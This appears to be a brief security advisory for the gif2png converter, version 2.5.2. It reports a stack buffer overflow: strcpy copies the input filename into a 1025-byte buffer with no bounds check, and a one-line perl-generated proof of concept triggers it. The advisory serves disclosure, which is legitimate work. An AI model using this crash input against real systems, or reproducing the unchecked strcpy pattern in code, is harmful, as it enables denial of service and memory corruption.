DESCRIPTION:
"The gif2png program converts files from the obsolescent Graphic Interchange
Format to Portable Network Graphics <http://www.libpng.org/pub/png/>. The
conversion preserves all graphic information, including transparency,
perfectly. The gif2png program can even recover data from corrupted GIFs."

homepage: http://catb.org/~esr/gif2png/ <http://catb.org/%7Eesr/gif2png/>

VULNERABILITY:
gif2png does not perform proper bounds checking on the size of input
filename. The buffer (1025 in size) is easily overrun with a strcpy
function.

AFFECTED VERSION:
latest: 2.5.2

POC:
$> ./gif2png $(perl -e 'print "A" x 1053')
